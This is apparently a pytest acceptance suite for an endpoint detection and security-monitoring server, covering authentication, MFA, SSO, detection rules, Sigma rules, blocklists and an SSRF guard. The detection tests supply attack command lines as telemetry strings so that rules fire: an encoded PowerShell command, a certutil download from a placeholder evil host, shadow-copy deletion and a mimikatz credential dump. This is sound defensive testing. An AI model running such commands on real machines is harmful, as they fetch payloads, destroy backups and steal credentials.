"""Feature acceptance suite — one runnable walk-through of every server-side
feature, mapped to the catalog in docs/FEATURES / the TEST-PLAN IDs.

Each test is a self-contained "does this feature work end-to-end via the API"
check. Running just this file demonstrates the whole product surface:

    pytest tests/test_acceptance.py -v

It complements (does not replace) the granular unit/integration suites.
"""
import time

import pytest

from app.core import totp
from app.core.config import settings
from app.core.roles import Role
from app.services import auth_service, sso
from tests.conftest import ADMIN_HEADERS

GOOD_PW = "Sup3rSecret!!"
AGENT = lambda dev: dev["headers"]  # noqa: E731


@pytest.fixture(autouse=True)
def _reset():
    auth_service.reset_rate_limit()
    sso._discovery_cache.clear()
    yield
    auth_service.reset_rate_limit()


# -- helpers --------------------------------------------------------------
def _emit(client, headers, **event):
    base = {"severity": "info", "summary": "", "details": {}}
    base.update(event)
    return client.post("/api/agent/telemetry", json={"events": [base]}, headers=headers)


def _rule_ids(client):
    return {d["rule_id"] for d in client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()}


def _user(db_factory, email, role):
    db = db_factory()
    auth_service.create_user(db, email, GOOD_PW, role)
    db.close()


def _login(client, email, **extra):
    r = client.post("/api/auth/login", json={"email": email, "password": GOOD_PW, **extra})
    return r


def _bearer(client, email, **extra):
    return {"Authorization": f"Bearer {_login(client, email, **extra).json()['access_token']}"}


# =========================================================================
# 1. Platform / enrollment
# =========================================================================
def test_platform_health(client):
    assert client.get("/api/health").json()["status"] == "ok"


def test_platform_enroll_and_telemetry(client, enrolled_device):
    assert enrolled_device["device_id"]
    r = _emit(client, AGENT(enrolled_device), source="agent", action="heartbeat", summary="ok")
    assert r.status_code == 200 and "accepted" in r.json()


def test_platform_bad_enroll_token_rejected(client):
    r = client.post("/api/agent/enroll", json={"enroll_token": "wrong", "hostname": "x", "platform": "y"})
    assert r.status_code == 401


# =========================================================================
# 2. Authentication, RBAC, MFA, SSO
# =========================================================================
def test_auth_login_and_bad_token(client, db_session_factory):
    _user(db_session_factory, "a@x.com", Role.ANALYST.value)
    assert _login(client, "a@x.com").json()["access_token"]
    assert client.get("/api/admin/detections").status_code == 401
    assert client.get("/api/admin/detections", headers={"X-Admin-Token": "nope"}).status_code == 401


def test_rbac_read_only_cannot_triage(client, enrolled_device, db_session_factory):
    _emit(client, AGENT(enrolled_device), source="port_watchdog", action="killed",
          details={"port": 4444})
    det_id = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()[0]["id"]
    _user(db_session_factory, "ro@x.com", Role.READ_ONLY.value)
    h = _bearer(client, "ro@x.com")
    assert client.get("/api/admin/detections", headers=h).status_code == 200
    assert client.post(f"/api/admin/detections/{det_id}/ack", headers=h).status_code == 403


def test_mfa_full_flow(client, db_session_factory):
    _user(db_session_factory, "mfa@x.com", Role.ANALYST.value)
    h = _bearer(client, "mfa@x.com")
    secret = client.post("/api/auth/mfa/setup", headers=h).json()["secret"]
    assert client.post("/api/auth/mfa/activate", headers=h,
                       json={"code": totp.totp(secret)}).json() == {"enabled": True}
    assert _login(client, "mfa@x.com").status_code == 401                       # code required
    assert _login(client, "mfa@x.com", mfa_code=totp.totp(secret)).status_code == 200


def test_sso_gated_and_provisions(client, monkeypatch):
    assert client.get("/api/auth/sso/login").status_code == 503                 # unconfigured
    monkeypatch.setattr(settings, "oidc_enabled", True)
    monkeypatch.setattr(settings, "oidc_issuer", "https://idp.example")
    monkeypatch.setattr(settings, "oidc_client_id", "c")
    monkeypatch.setattr(settings, "oidc_client_secret", "s")
    monkeypatch.setattr(settings, "oidc_redirect_uri", "https://x/cb")
    monkeypatch.setattr(sso, "discovery", lambda: {"authorization_endpoint": "https://idp/a"})
    assert client.get("/api/auth/sso/login").json()["authorization_url"].startswith("https://idp/a")
    monkeypatch.setattr(sso, "fetch_claims",
                        lambda code, state: {"email": "sso@x.com", "email_verified": True})
    assert client.get("/api/auth/sso/callback?code=a&state=b").json()["access_token"]


# =========================================================================
# 3. Detection engine + rule families
# =========================================================================
def test_detection_behavioral_rules(client, enrolled_device):
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"command_line": "powershell -nop -enc SQBFAFgA"})
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"command_line": "certutil.exe -urlcache -f http://evil/x.exe"})
    _emit(client, AGENT(enrolled_device), source="port_watchdog", action="killed",
          severity="critical", details={"port": 4444})
    ids = _rule_ids(client)
    assert {"powershell_abuse", "encoded_command", "lolbin_execution", "reverse_shell"} <= ids


def test_detection_ransomware_and_creddump(client, enrolled_device):
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"command_line": "vssadmin.exe delete shadows /all /quiet"})
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"command_line": "mimikatz.exe sekurlsa::logonpasswords"})
    ids = _rule_ids(client)
    assert "ransomware_behavior" in ids and "credential_dumping" in ids


def test_detection_triage_transitions(client, enrolled_device):
    _emit(client, AGENT(enrolled_device), source="port_watchdog", action="killed",
          details={"port": 4444})
    det_id = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()[0]["id"]
    assert client.post(f"/api/admin/detections/{det_id}/ack",
                       headers=ADMIN_HEADERS).json()["status"] == "acknowledged"
    assert client.post(f"/api/admin/detections/{det_id}/resolve",
                       headers=ADMIN_HEADERS).json()["status"] == "resolved"


def test_detection_monitor_source_rules(client, enrolled_device):
    """YARA, Suricata, tamper, registry sources each produce their detection."""
    _emit(client, AGENT(enrolled_device), source="yara", action="quarantined",
          severity="critical", details={"rules": ["Mal"], "path": "/tmp/x"})
    _emit(client, AGENT(enrolled_device), source="suricata", action="alert",
          details={"signature": "ET MALWARE", "src_ip": "1.1.1.1", "dest_ip": "2.2.2.2"})
    _emit(client, AGENT(enrolled_device), source="agent", action="tamper",
          severity="critical", details={"device_id": "d"})
    _emit(client, AGENT(enrolled_device), source="registry_monitor", action="autorun_added",
          summary=r"autorun HKCU\...\CurrentVersion\Run\Evil -> C:\evil.exe",
          details={"command_line": r"C:\evil.exe"})
    ids = _rule_ids(client)
    assert {"yara_match", "suricata_alert", "tamper_detected", "registry_persistence"} <= ids


# =========================================================================
# 4. Threat intel / Sigma
# =========================================================================
def test_intel_ioc_subdomain_match(client, enrolled_device):
    client.post("/api/admin/intel/iocs", headers=ADMIN_HEADERS,
                json={"ioc_type": "domain", "value": "bad.example", "confidence": 90})
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"domain": "c2.bad.example"})
    assert "ioc_match" in _rule_ids(client)


def test_sigma_rule_lifecycle(client, enrolled_device):
    rule = ("title: PS enc\nid: acc-ps\nlevel: high\ntags: [attack.t1059.001]\n"
            "detection:\n  sel:\n    CommandLine|contains: '-enc'\n  condition: sel\n")
    assert client.post("/api/admin/intel/rules", headers=ADMIN_HEADERS,
                       json={"kind": "sigma", "name": "acc", "content": rule,
                             "enabled": True}).status_code == 201
    assert client.post("/api/admin/intel/rules", headers=ADMIN_HEADERS,
                       json={"kind": "sigma", "name": "bad", "content": "title: x",
                             "enabled": True}).status_code == 400   # invalid rejected
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"command_line": "powershell -enc AAAA"})
    assert "sigma:acc-ps" in _rule_ids(client)


# =========================================================================
# 5. Blocking (domain / URL / subdomain)
# =========================================================================
def test_blocklist_domain_covers_subdomains(client, enrolled_device):
    assert client.post("/api/admin/blocklist", headers=ADMIN_HEADERS,
                       json={"kind": "domain", "value": "https://example.com/x"}).status_code in (200, 201)
    bl = client.get("/api/admin/blocklist", headers=ADMIN_HEADERS).json()
    assert any(e["value"] == "example.com" for e in bl)                          # URL normalized
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"domain": "evil.example.com"})
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"command_line": "curl https://cdn.example.com/p"})
    _emit(client, AGENT(enrolled_device), source="process", action="exec",
          details={"domain": "notexample.com"})
    hits = [d for d in client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
            if d["rule_id"] == "blocklist_domain"]
    observed = {h["details"]["observed"] for h in hits}
    assert "evil.example.com" in observed
    assert any("cdn.example.com" in o for o in observed)
    assert not any("notexample.com" in o for o in observed)                      # boundary-safe


# =========================================================================
# 6. Analytics / compliance / AI / integrations
# =========================================================================
def test_analytics_endpoints(client, enrolled_device):
    _emit(client, AGENT(enrolled_device), source="port_watchdog", action="killed",
          severity="critical", details={"port": 4444})
    summary = client.get("/api/admin/analytics/summary", headers=ADMIN_HEADERS).json()
    assert summary["devices"] >= 1 and summary["detections"] >= 1
    assert client.get("/api/admin/analytics/mitre-coverage", headers=ADMIN_HEADERS).status_code == 200


def test_compliance_report_controls(client, enrolled_device):
    _emit(client, AGENT(enrolled_device), source="port_watchdog", action="killed",
          severity="critical", details={"port": 4444})
    rep = client.get("/api/admin/analytics/compliance-report", headers=ADMIN_HEADERS).json()
    assert 0 <= rep["score"] <= 100 and len(rep["controls"]) >= 8
    assert rep["detections"]["open_critical"] >= 1


def test_integration_ssrf_blocks_loopback(client):
    r = client.post("/api/admin/integrations", headers=ADMIN_HEADERS,
                    json={"name": "x", "kind": "webhook", "target": "http://127.0.0.1/h",
                          "min_severity": "low", "enabled": True})
    assert r.status_code == 400 and "SSRF" in r.json()["detail"]


def test_ai_assistant_gated_and_works(client, enrolled_device, monkeypatch):
    from app.services import ai_assistant
    _emit(client, AGENT(enrolled_device), source="port_watchdog", action="killed",
          details={"port": 4444})
    det_id = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()[0]["id"]
    assert client.post(f"/api/admin/detections/{det_id}/explain",
                       headers=ADMIN_HEADERS).status_code == 503                  # AI off
    monkeypatch.setattr(settings, "ai_enabled", True)
    monkeypatch.setattr(settings, "anthropic_api_key", "sk-test")
    monkeypatch.setattr(ai_assistant, "explain_detection",
                        lambda d, e=None, *, client=None: {
                            "summary": "s", "mitre_explanation": "m", "remediation": ["r"],
                            "confidence": "high", "model": "test", "generated_at": "t"})
    body = client.post(f"/api/admin/detections/{det_id}/explain", headers=ADMIN_HEADERS).json()
    assert body["summary"] == "s" and body["remediation"] == ["r"]


# =========================================================================
# 7. Multi-tenancy / licensing
# =========================================================================
def test_licensing_device_cap(client, db_session_factory):
    from app.models import DEFAULT_ORG_ID, Organization
    db = db_session_factory()
    org = db.get(Organization, DEFAULT_ORG_ID)
    if org is None:
        org = Organization(id=DEFAULT_ORG_ID, name="Default", slug="default")
        db.add(org)
    org.max_devices = 1
    db.commit()
    db.close()
    client.post("/api/agent/enroll", json={"enroll_token": _enroll_token(), "hostname": "d1", "platform": "L"})
    r = client.post("/api/agent/enroll", json={"enroll_token": _enroll_token(), "hostname": "d2", "platform": "L"})
    assert r.status_code == 402


def _enroll_token():
    from app.auth import ENROLL_TOKEN
    return ENROLL_TOKEN
